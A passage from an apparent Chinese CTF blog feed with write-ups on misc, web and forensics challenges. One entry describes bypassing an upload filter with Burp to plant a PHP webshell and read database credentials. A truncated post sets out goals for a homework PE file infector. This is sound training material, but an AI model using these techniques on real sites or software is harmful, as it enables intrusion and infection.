    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=4575&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-Recreators</title>
    <link href="https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-Recreators/"/>
    <id>https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-Recreators/</id>
    <published>2020-05-31T09:17:22.000Z</published>
    <updated>2020-06-08T11:30:25.710Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=5133">点击这里去答题</a></p><a id="more"></a><h1 id="Recreators"><a href="#Recreators" class="headerlink" title="Recreators"></a>Recreators</h1><p>首先下载并解压，可以看到没有拓展名<br><img src="https://img-blog.csdnimg.cn/20200520151157903.png" alt><br>直接winhex打开看看<br><img src="https://img-blog.csdnimg.cn/20200520151241974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>由这里可以看出该文件应该是一个VMware虚拟磁盘镜像，那么修改拓展名为.vmdk，再用winhex打开。<br><img src="https://img-blog.csdnimg.cn/20200520151403597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>可以看到，winhex是由对vmdk格式的解析的。<br><img src="https://img-blog.csdnimg.cn/20200520151446244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>打开可以看到这些内容，带$的都是系统文件，肯定先看misc.mp4<br>保存出来，打开看看<br><img src="https://img-blog.csdnimg.cn/20200520151848389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>经典动漫recreator的ED。来到了隐写的部分</p><p>此时一般思路是使用binwalk之类的看看有没有附加的东西，或者直接拿16进制编辑器看看，我选择了后者，因为前面都是视屏内容，我们从后往前看。<br><img src="https://img-blog.csdnimg.cn/20200520152235999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>在某个位置发现了很奇怪的东西，全整下来，一顿操作，得到flag<br>具体步骤是<br>hex解码<br>hex解码<br>base32解码<br>base32解码<br>base32解码<br>base64解码<br>base64解码<br>hex解码<br>base32解码<br>base64解码<br>base64解码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! python2</span><br><span class="line">import base64</span><br><span class="line">a&#x3D;&quotquot;</span><br><span class="line">b&#x3D;a.decode(&#39;hex&#39;)</span><br><span class="line"># print b</span><br><span class="line">c&#x3D;b.decode(&#39;hex&#39;)</span><br><span class="line"># print c</span><br><span class="line">d&#x3D;base64.b32decode(c)</span><br><span class="line"># print d</span><br><span class="line">e&#x3D;base64.b32decode(d)</span><br><span class="line"># print(e)</span><br><span class="line">f&#x3D;base64.b32decode(e)</span><br><span class="line"># print(f)</span><br><span class="line">g&#x3D;base64.b64decode(f)</span><br><span class="line"># print(g)</span><br><span class="line">h&#x3D;base64.b64decode(g)</span><br><span class="line"># print(h)</span><br><span class="line">i&#x3D;h.decode(&#39;hex&#39;)</span><br><span class="line"># print(i)</span><br><span class="line">j&#x3D;base64.b32decode(i)</span><br><span class="line"># print(j)</span><br><span class="line">k&#x3D;base64.b64decode(j)</span><br><span class="line"># print(k)</span><br><span class="line">l&#x3D;base64.b64decode(k)</span><br><span class="line">print(l)</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>python2的hex转换还是比python3来的好，为什么python2不给耍了呢？？？</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=5133&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-手贱的A君</title>
    <link href="https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%89%8B%E8%B4%B1%E7%9A%84A%E5%90%9B/"/>
    <id>https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%89%8B%E8%B4%B1%E7%9A%84A%E5%90%9B/</id>
    <published>2020-05-31T09:16:16.000Z</published>
    <updated>2020-06-08T11:30:16.614Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=2499">点击这里去答题</a></p><a id="more"></a><h2 id="手贱的A君"><a href="#手贱的A君" class="headerlink" title="手贱的A君"></a>手贱的A君</h2><p><img src="https://img-blog.csdnimg.cn/20200518203024514.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">关键词：数据库，md5，拿着这一串莽头去md5在线解密<br><img src="https://img-blog.csdnimg.cn/20200518203138966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>果然不会那么简单的。<br>定睛一看，这md5好像是33位啊¿<br>定睛两看，这怎么害有个l啊？众所周知md5的内容里只有0-9和abcdef呀？<br><img src="https://img-blog.csdnimg.cn/20200518203501264.png" alt="在这里插入图片描述"><br>删去l再解密，果然正确了。<br><img src="https://img-blog.csdnimg.cn/20200518203535864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>MD5算法的原理可简要的叙述为：MD5码以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。<br>md5的算法可以分为五步，描述如下：<br>第一步，补位：<br>MD5算法先对输入的数据进行补位，使得数据的长度(以byte为单位)对64求余的结果是56。<br>即数据扩展至LEN=K*64+56个字节，K为整数。<br>补位方法：补一个1，然后补0至满足上述要求。相当于补一个0x80的字节，再补值<br>为0的字节。这一步里总共补充的字节数为0～63个。</p><p>第二步，附加数据长度：<br>用一个64位的整数表示数据的原始长度(以bit为单位)，将这个数字的8个字节按低位的在前，<br>高位在后的顺序附加在补位后的数据后面。这时，数据被填补后的总长度为：<br>LEN = K<em>64+56+8=(K+1)</em>64 Bytes。</p><p>※注意那个64位整数是输入数据的原始长度而不是填充字节后的长度,我就在这里栽了跟头.</p><p>第三步，初始化MD5参数：<br>有四个32位整数变量 (A,B,C,D) 用来计算信息摘要，每一个变量被初始化成以下<br>以十六进制数表示的数值，低位的字节在前面。<br>word A: 01 23 45 67<br>word B: 89 ab cd ef<br>word C: fe dc ba 98<br>word D: 76 54 32 10<br>※注意低位的字节在前面指的是Little Endian平台上内存中字节的排列方式，<br>而在程序中书写时，要写成：<br>A=0x67452301<br>B=0xefcdab89<br>C=0x98badcfe<br>D=0x10325476</p><p>第四步，定义四个MD5基本的按位操作函数：<br>X，Y，Z为32位整数。<br>F(X,Y,Z) = (X and Y) or (not(X) and Z)<br>G(X,Y,Z) = (X and Z) or (Y and not(Z))<br>H(X,Y,Z) = X xor Y xor Z<br>I(X,Y,Z) = Y xor (X or not(Z))</p><p>参考：<br><a href="https://www.cnblogs.com/minady/articles/134379.html">https://www.cnblogs.com/minady/articles/134379.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=2499&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-DoYouKnowUpload</title>
    <link href="https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-DoYouKnowUpload/"/>
    <id>https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-DoYouKnowUpload/</id>
    <published>2020-05-31T09:11:22.000Z</published>
    <updated>2020-06-08T11:30:29.293Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=4581">点击这里去答题</a></p><a id="more"></a><h1 id="main"><a href="#main" class="headerlink" title="main"></a>main</h1><p>打开看到是一个图片上传<br><img src="https://img-blog.csdnimg.cn/20200522085836321.png" alt><br>首先假设它妹有拓展名过滤，直接传个一句话。<br><img src="https://img-blog.csdnimg.cn/20200522085940832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>假设不成立。把一句话的拓展名改为.jpg，打开burpsuit，在发的时候再把jpg改成php</p><p><img src="https://img-blog.csdnimg.cn/20200522090246740.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>会返回给你它的路径。<br><img src="https://img-blog.csdnimg.cn/2020052209032766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>访问一下看看是不是就是那个路径<br><img src="https://img-blog.csdnimg.cn/20200522090522781.png" alt><br>发现确实如此。用蚁剑连接，可以看到html目录下有一个config.php<br><img src="https://img-blog.csdnimg.cn/20200522090632419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt>内容如下<br><img src="https://img-blog.csdnimg.cn/20200522090705213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>所以直接去连数据库<br><img src="https://img-blog.csdnimg.cn/20200522090746726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt><br>然后一顿找，就找到了flag<br><img src="https://img-blog.csdnimg.cn/20200522090831288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Jic3poZW5zaHVhaQ==,size_16,color_FFFFFF,t_70" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=4581&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="web" scheme="https://blog.pillar.fun/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-流量分析</title>
    <link href="https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://blog.pillar.fun/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2020-05-31T08:36:44.000Z</published>
    <updated>2020-06-08T11:30:22.263Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=4601">点击这里去答题</a></p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>下载题目并解压，可以看到两个文件，一个pcapng和一个log<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1.jpg" alt><br>先notepad看看这个log<br>发现全是乱码，但是在179行有<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.jpg" alt><br>于是打算复制下来放在winhex看看，然而178行也有部分内容，我又选不上，于是winhex打开log，然后复制内容粘贴到notepad，再把notepad的内容复制，贴回winhex，注意要选ascii hex。<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.jpg" alt><br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.jpg" alt><br>可以看到Rar！，于是存出来，把拓展名改为rar<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/5.jpg" alt><br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/6.jpg" alt><br>rar是被加密的<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/7.jpg" alt><br>于是wireshark查看pcapng，直接导出http对象<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/8.jpg" alt><br>（md还有个这图吓我一跳）<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/9.jpg" alt><br>看看html，可以找到一段jsfuck<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/10.jpg" alt><br>复制下来到浏览器控制台试一下<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11.jpg" alt><br>输入密码，拿到flag<br><img src="/2020/05/31/i%E6%98%A5%E7%A7%8B-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/12.jpg" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=4601&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-zip</title>
    <link href="https://blog.pillar.fun/2020/04/12/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-zip/"/>
    <id>https://blog.pillar.fun/2020/04/12/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-zip/</id>
    <published>2020-04-12T03:34:07.000Z</published>
    <updated>2022-04-08T04:43:17.693Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h1><p>开局一个压缩包，打开全是压缩包</p><p><img src="/2020/04/12/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-zip/1.jpg" alt="img"></p><p>每个压缩包都不大，crc暴破。但是并不是很会，就去看了别人的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span>(<span class="params">crc</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">s = i + j + k + h</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">f.write(s)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">file = <span class="string">&#x27;out&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">crc = zipfile.ZipFile(file,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">CrackCrc(crc)</span><br><span class="line">print(<span class="string">&#x27;\r&#x27;</span>+<span class="string">&quot;loading：&#123;:%&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">float</span>((i+<span class="number">1</span>)/<span class="number">68</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;\nCRC32begin&quot;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">print(<span class="string">&quot;CRC32finished&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>用zipfile来读取zip中的crc32。</p><p>暴破完了就得到</p><p><code>z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</code></p><p>base64解码，显然是字节流</p><p>用脚本写进文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==&#x27;</span></span><br><span class="line">fd=<span class="built_in">open</span>(<span class="string">&#x27;result.bin&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">b=base64.b64decode(s)</span><br><span class="line">fd.write(b)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure><p>十六进制编辑器打开一看</p><p><img src="/2020/04/12/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-zip/2.jpg" alt="img"></p><p>提示我们修补文件，得到flag，且在最后显然是一个文件的尾部，经过查询，发现是rar的尾部，但是显然没有rar头部，所以加个rar头部</p><p><code>52 61 72 21 1A 07 00</code></p><p>打开一看，注释里是flag（7z无法看到rar的注释，用winrar看注释吧）</p><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-SWP</title>
    <link href="https://blog.pillar.fun/2020/04/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-SWP/"/>
    <id>https://blog.pillar.fun/2020/04/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-SWP/</id>
    <published>2020-04-11T09:21:26.000Z</published>
    <updated>2022-04-07T09:31:08.523Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="ACTF新生赛2020-swp"><a href="#ACTF新生赛2020-swp" class="headerlink" title="[ACTF新生赛2020]swp"></a>[ACTF新生赛2020]swp</h1><p>开局一个流量包</p><p><img src="/2020/04/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-SWP/1.jpg" alt="img"></p><p>估计是用wget去下载什么东西，直接导出html对象</p><p><img src="/2020/04/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-SWP/2.jpg" alt="img"></p><p>看到一个secret.zip，解压出来</p><p><img src="/2020/04/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-SWP/3.jpg" alt="img"></p><p>打开看一眼，发现是个elf，放到kali里，加运行权限，看看能不能直接运行</p><p><img src="/2020/04/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-SWP/4.jpg" alt="img"></p><p>运行？运行歌姬吧，直接strings</p><p><img src="/2020/04/11/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-SWP/5.jpg" alt="img"></p><p>得到答案actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>BUU刷题日记-弱口令</title>
    <link href="https://blog.pillar.fun/2020/04/09/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    <id>https://blog.pillar.fun/2020/04/09/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</id>
    <published>2020-04-09T07:48:48.000Z</published>
    <updated>2022-04-02T10:37:45.225Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>开局一个带密码的压缩包。直奔注释</p><p>看上去没有，但实际上有</p><p><img src="/2020/04/09/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%BC%B1%E5%8F%A3%E4%BB%A4/1.jpg" alt="img"></p><p>在编辑器里更容易看</p><p><img src="/2020/04/09/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%BC%B1%E5%8F%A3%E4%BB%A4/2.jpg" alt="img"></p><p>猜测是摩斯密码，用-替换tab，用.替换空格</p><p><img src="/2020/04/09/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E5%BC%B1%E5%8F%A3%E4%BB%A4/3.jpg" alt="img"></p><p>解压得到一张赵丽颖</p><p>然后用<a href="https://github.com/livz/cloacked-pixel进行提取，密码是123456">https://github.com/livz/cloacked-pixel进行提取，密码是123456</a></p><p>（不懂就问，这个和stegpy那个有什么区别啊）</p><p>就得到flag了</p><p>flag{jsy09-wytg5-wius8}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="补题" scheme="https://blog.pillar.fun/tags/%E8%A1%A5%E9%A2%98/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PE病毒</title>
    <link href="https://blog.pillar.fun/2020/04/08/PE%E7%97%85%E6%AF%92/"/>
    <id>https://blog.pillar.fun/2020/04/08/PE%E7%97%85%E6%AF%92/</id>
    <published>2020-04-08T05:45:59.000Z</published>
    <updated>2020-04-08T12:20:43.318Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>这是我软件安全作业，希望对想要学习PE病毒编写的同学们有所帮助。</p><a id="more"></a><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>编写一个PE文件传染程序infect.exe，功能要求如下：</p><ol><li>infect.exe运行后，向同目录下的notepad.exe程序植入“病毒载荷”代码.</li><li>infect.exe不能重复传染notepad.exe.</li><li>notepad.exe被植入“病毒载荷”后，具备如下行为：一旦执行，就会向其所在目录写入一个txt文件，文件名为：学号-姓名.txt，文件内容为空。注意：这里的姓名和学号要改为同学自己的名字和学号。</li></ol><h1 id="基本思路"><a href="#基本思路" class="headerlink" 